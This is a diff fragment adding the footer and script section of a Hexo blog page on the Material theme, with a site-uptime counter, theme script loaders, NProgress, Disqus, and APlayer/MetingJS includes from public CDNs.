+        <span class="post-count">&nbsp;|&nbsp;字数统计：33.6k</span>
+    </div>
+
+    <!-- Paradox Footer Right Section -->
+
+    <!--
+        I am glad you use this theme, the development is no so easy, I hope you can keep the copyright.
+        It will not impact the appearance and can give developers a lot of support :)
+
+        很高兴您使用该主题，开发不易，希望您可以保留一下版权声明。
+        它不会影响美观并可以给开发者很大的支持。 :)
+        -->
+
+    <div class="mdl-mini-footer--right-section">
+        <div>
+            <div class="footer-develop-div">Powered by <a href="https://hexo.io" rel='external nofollow' target="_blank" class="footer-develop-a">Hexo</a></div>
+            <div class="footer-develop-div">Theme - <a href="https://github.com/viosey/hexo-theme-material" rel='external nofollow' target="_blank" class="footer-develop-a">Material</a></div>
+        </div>
+    </div>
+    
+    <script>
+        var now = new Date();
+
+        function createtime() {
+            var grt = new Date("07/01/2019 17:38:00"); //在此处修改你的建站时间
+            now.setTime(now.getTime() + 250);
+            days = (now - grt) / 1000 / 60 / 60 / 24;
+            dnum = Math.floor(days);
+            hours = (now - grt) / 1000 / 60 / 60 - (24 * dnum);
+            hnum = Math.floor(hours);
+            if (String(hnum).length == 1) {
+                hnum = "0" + hnum;
+            }
+            minutes = (now - grt) / 1000 / 60 - (24 * 60 * dnum) - (60 * hnum);
+            mnum = Math.floor(minutes);
+            if (String(mnum).length == 1) {
+                mnum = "0" + mnum;
+            }
+            seconds = (now - grt) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+            snum = Math.round(seconds);
+            if (String(snum).length == 1) {
+                snum = "0" + snum;
+            }
+            document.getElementById("timeDate").innerHTML = "本站已运行 " + dnum + " 天 ";
+            document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+        }
+        setInterval("createtime()", 250);
+
+    </script>
+
+
+</footer>
+
+
+                    <!-- Import JS File -->
+
+    <script>lsloader.load("lazyload_js","/js/lazyload.min.js?1BcfzuNXqV+ntF6gq+5X3Q==", true)</script>
+
+
+
+    <script>lsloader.load("js_js","/js/js.min.js?Bn9UzEm8RrBSxqyZB0zPjA==", true)</script>
+
+
+
+    <script>lsloader.load("np_js","/js/nprogress.js?pl3Qhb9lvqR1FlyLUna1Yw==", true)</script>
+
+
+<script type="text/ls-javascript" id="NProgress-script">
+    NProgress.configure({
+        showSpinner: true
+    });
+    NProgress.start();
+    $('#nprogress .bar').css({
+        'background': '#29d'
+    });
+    $('#nprogress .peg').css({
+        'box-shadow': '0 0 10px #29d, 0 0 15px #29d'
+    });
+    $('#nprogress .spinner-icon').css({
+        'border-top-color': '#29d',
+        'border-left-color': '#29d'
+    });
+    setTimeout(function() {
+        NProgress.done();
+        $('.fade').removeClass('out');
+    }, 800);
+</script>
+
+
+
+
+
+
+
+
+
+   <!-- 使用 DISQUS js 代码 -->
+<!-- <script id="dsq-count-scr" src="//peropero.disqus.com/count.js" async></script> -->
+<script id="dsq-count-scr" src="https://c.disquscdn.com/count.js" async></script>
+
+
+
+
+
+<!-- UC Browser Compatible -->
+<script>
+	var agent = navigator.userAgent.toLowerCase();
+	if(agent.indexOf('ucbrowser')>0) {
+		document.write('<link rel="stylesheet" href="/css/uc.css">');
+	   alert('由于 UC 浏览器使用极旧的内核，而本网站使用了一些新的特性。\n为了您能更好的浏览，推荐使用 Chrome 或 Firefox 浏览器。');
+	}
+</script>
+
+<!-- Import prettify js  -->
+
+
+    
+        <script>lsloader.load("hanabi","/js/hanabi-browser-bundle.js?Pki5+pzkluqu53g+ouMWpA==", true)</script>
+    
+
+
+<!-- Window Load -->
+<!-- add class for prettify -->
+<script type="text/ls-javascript" id="window-load">
+    $(window).on('load', function() {
+        // Post_Toc parent position fixed
+        $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
+    });
+
+    
+    
+        
+        
+        HanabiBrowser.start('pre code',false);
+    
+</script>
+
+<!-- MathJax Load-->
+
+
+<!-- Bing Background -->
+
+
+<script type="text/ls-javascript" id="lazy-load">
+    // Offer LazyLoad
+    queue.offer(function(){
+        $('.lazy').lazyload({
+            effect : 'show'
+        });
+    });
+
+    // Start Queue
+    $(document).ready(function(){
+        setInterval(function(){
+            queue.execNext();
+        },200);
+    });
+</script>
+
+<!-- Custom Footer -->
+
+
+
+<script>
+    var copyrightNow = new Date().getFullYear();
+    var textContent = document.querySelector('span[year]')
+
+    copyrightSince = 2018;
+    if (copyrightSince === copyrightNow||copyrightSince === 0000) {
+        textContent.textContent = copyrightNow
+    } else {
+        textContent.textContent = copyrightSince + ' - ' + copyrightNow
+    }
+
+    (function(){
+        var scriptList = document.querySelectorAll('script[type="text/ls-javascript"]')
+
+        for (var i = 0; i < scriptList.length; ++i) {
+            var item = scriptList[i];
+            lsloader.runInlineScript(item.id,item.id);
+        }
+    })()
+console.log('\n %c © Material Theme | Version: 1.5.6 | https://github.com/viosey/hexo-theme-material %c \n', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-left-radius:5px;border-bottom-left-radius:5px;', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-right-radius:5px;border-bottom-right-radius:5px;');
+</script>
+
+                </main>
+            </div>
+        </body>
+    
+    <script type="text/javascript" src="/js/funnytitle.js"></script>
+<!--
+    <script type="text/javascript" color="255,255,255" opacity='1' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+-->
+
+<!-- <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 9999999; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script> -->
+<script type="text/javascript" src="/js/clicklove.js"></script>
+
+<!-- require APlayer -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+<!-- require MetingJS -->
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+</html>
